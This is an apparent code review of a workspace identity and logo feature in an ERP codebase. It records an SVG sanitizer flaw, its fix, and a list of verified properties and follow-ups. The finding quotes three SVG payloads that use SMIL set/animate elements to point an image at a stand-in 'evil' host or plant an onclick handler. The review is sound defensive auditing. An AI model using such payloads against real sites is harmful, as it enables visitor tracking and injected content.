# Review: B5 slice 1, Workspace identity server + CLI

Branch `feat/b5-identity` in `../athena-erp-b5`, diffed against `main`.
First review at `2e5595e` ended NEEDS_CHANGES (blocker B1 below); re-review at `e80ad39`.

Verdict: PASS

## Re-review at `e80ad39` (fix loop 1)

The worker removed `animate`, `animateTransform`, `animateMotion`, `mpath` and `set` from `keepElements` (`internal/brand/svg.go`) so they drop with their subtree, and added the three regression subtests (`set cannot rewrite href`, `animate cannot rewrite href`, `set cannot plant an event handler`). I re-ran all three original attack inputs plus `animateTransform` and `animateMotion`/`mpath` variants against the fixed code: every one is stripped to the bare parent element, `ValidateLogo` output for the attack SVG is clean, and a legit gradient logo still round-trips. The three new subtests run and pass inside `TestSanitizeSVG`. A CLI end-to-end on a throwaway `test_athena_*` workspace stored a combined set/href + animate/href + set/onclick SVG and the stored bytes contain zero attack traces (test database dropped afterwards, dev database untouched). Regression: `gofmt -l cmd internal` empty, `go build`/`go vet` pass, full `make test` green (all Go packages ok, web 33 files / 405 tests passed). The fix commit touches only `svg.go` and `brand_test.go`, so `make generate` is unaffected. Blocker B1 is closed; nothing new found. Follow-ups F1-F6 stand as recorded.

## Blocker (closed in `e80ad39`)

### B1. SMIL animation elements smuggle event handlers and external references past the SVG sanitizer

`internal/brand/svg.go:48-49` keeps `animate`, `animatetransform`, `animatemotion`, `mpath` and `set`, and `cleanAttrs` (`svg.go:207-241`) keeps their `attributeName`/`to`/`from`/`by`/`values` attributes verbatim (default case). I probed the real code and all three of these survive `SanitizeSVG` unchanged:

- `<image ...><set attributeName="href" to="http://evil/x.png"/></image>` — stored as-is.
- `<image ...><animate attributeName="href" values="http://evil/x.png" dur="1s"/></image>` — stored as-is.
- `<rect ...><set attributeName="onclick" to="alert(1)"/></rect>` — stored as-is.

This breaks two of the four properties brief item 2 requires ("no scripts, event handlers, external references, foreignObject"). The `<set>`/`<animate>` href rewrite fires at render time in every visitor's browser, including unauthenticated sign-in page views: SMIL runs in `<img>` image context, and the serving `Content-Security-Policy: sandbox` (`internal/server/brand.go:140`) blocks scripts but does not block subresource image loads, so the attacker's URL is fetched (visitor-IP beacon plus attacker-chosen pixels rendered inside the logo box). Script execution itself is contained by today's layers (sandbox on direct view, scriptless `<img>`, Desk page CSP if slice 2 inlines), but the external-reference exfil is not. Suggested fix: drop the five animation elements from `keepElements` (a logo has no business animating) and add regression tests for the three inputs above.

Everything else I probed holds: `<script>`/`<style>`/`<handler>`/`<listener>`/`<font-face-uri>`/`<filter>`/mixed-case `<ForeignObject>` dropped, `on*` attributes dropped at any case, `href`/`src` limited to `#fragment` and `data:image/`, `javascript:`/`data:text/html` refused, `url()` paint limited to local refs, `style` allowlist tight (external `url()` dropped), doctypes/entities/PIs dropped, no-dimension and oversize SVGs refused, non-PNG bytes named `.png` refused.

## What passed (brief items 1-7)

1. `WorkspaceService.GetIdentity` is public and returns display name plus the four brand URLs only — verified over live RPC (`{"identity":{"displayName", "logoLightUrl", "logoDarkUrl", "favicon32Url", "favicon180Url"}}`, nothing else). `SetIdentity` requires `settings:workspace` at the gate (`internal/server/gate.go:51`) and in the handler (`internal/server/workspace.go:118`); anonymous callers get `unauthenticated`, unpermitted callers `permission_denied` (covered by `TestWorkspaceIdentityPermissionsAndLogos` over real HTTP). The permission is in `SystemPermissions` (`internal/auth/principal.go:85`) and not in `BuildAccess` (`internal/auth/security.go:163-172`, which also excludes `settings:appearance` — consistent).
2. Logo validation: PNG or SVG by extension (any case), ≤512 KB, dimensions 1-2048 px checked (`internal/brand/logo.go`), PNG fully decoded at validation. SVG sanitizer as above except B1.
3. Storage goes through `internal/files` under `brand/` with versions and `athena:file` audit entries (asserted in tests, files observed on disk in the e2e). `GET /brand/logo-<hash>.<ext>` serves same-origin with `Cache-Control: public, max-age=31536000, immutable`, `nosniff`, and `Content-Security-Policy: sandbox` for SVG (all verified with curl, including that the served SVG bytes are the sanitized ones). Unknown hashes, bad patterns and wrong favicon sizes 404. FileService refuses brand writes and hides brand/ from listings (`internal/server/files.go:155-157,197-199,217-219,237-239`) while still allowing reads.
4. Favicons 32 + 180 px render from the light PNG logo (live 32 px response verified as a valid 32x32 PNG); the Athena mark is the fallback, including for SVG light logos. Worktree root copies are gone; B2's `web/src/assets/brand/athena-black.png` is reused, and `TestMarkFaviconsMatchDeskMark` fails if the embedded marks drift from it.
5. CLI `athena workspace identity show|set --name --logo-light --logo-dark` and `athena new --logo` all exercised end-to-end on throwaway workspaces; errors are plain language (`the display name holds 1 to 80 characters`, `... is larger than 524288 bytes`, `"x.jpg" is not a logo; use a .png or .svg file`). Empty args print usage (`isHelp` covers `len(args) == 0`).
6. Proto diff is additive only (two RPCs, five new messages, no touched field). Both procedures have `procedurePolicies` entries and `TestEveryProcedureHasAPolicy` passes. `make generate` run twice with no diff. No migrations or ADRs, as expected — identity reuses the G5 Settings chain (`brand.identity`) and the files tables.
7. `gofmt -l cmd internal` empty, `go build ./...` and `go vet ./...` pass, `make test` passes (Go suite plus 405 web tests across 33 files), focused identity/brand/policy tests pass unskipped against MariaDB, web typecheck passes, and the CLI + HTTP end-to-end above ran against two throwaway `test_athena_*` workspaces on a fake HOME (port 127.0.0.1:3217) with the dev database untouched. Both test databases were dropped and the server stopped afterwards; the worktree is clean.

## Follow-ups (non-blocking)

- F1. `athena role` help text omits the `settings:*` permissions (`cmd/athena/main.go:142`; pre-existing for `settings:appearance`/`settings:security` on `main`, now also `settings:workspace`). Grants work via JSON validation against `SystemPermissions` — help text only.
- F2. `athena new --logo` reads the file before creating but validates its content only after the workspace and database exist (`cmd/athena/main.go:288-292`). A bad logo errors after creation; consider `brand.ValidateLogo` up front (missing files already fail fast).
- F3. Concurrent `SetIdentity` saves race read-modify-write: each publishes from the doc it read, so one side's change can be silently overwritten and its file pruned (`internal/server/workspace.go:144-180`). The doc stays self-consistent and old generations remain in `athena_setting_values`; consider documenting last-writer-wins or serializing.
- F4. `SetIdentity` returns a prune error after the settings save has committed, so the client sees failure though the save landed (`internal/server/workspace.go:174-179`). Retries are safe.
- F5. Favicons re-render from the full PNG (up to 2048 px) on every public request (`internal/server/brand.go:123`). Fine on loopback; consider caching rendered bytes later.
- F6. `identity set` with no flags publishes a new identical settings generation instead of short-circuiting.
